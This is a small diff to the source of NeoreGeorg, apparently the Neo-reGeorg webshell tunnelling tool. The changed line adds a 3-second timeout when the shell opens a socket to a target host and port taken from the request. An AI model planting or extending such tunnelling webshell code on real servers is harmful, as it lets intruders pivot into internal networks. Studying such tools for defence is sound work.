@@ -161,7 +161,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                         String target = target_ary[0];
                         int port = Integer.parseInt(target_ary[1]);
                         SocketChannel socketChannel = SocketChannel.open();
-                        socketChannel.connect(new InetSocketAddress(target, port));
+                        socketChannel.socket().connect(new InetSocketAddress(target, port), 3000); // set timeout 3 seconds, default 120 seconds
                         socketChannel.configureBlocking(false);
                         application.setAttribute(mark, socketChannel);
                         response.setHeader(XSTATUS, OK);
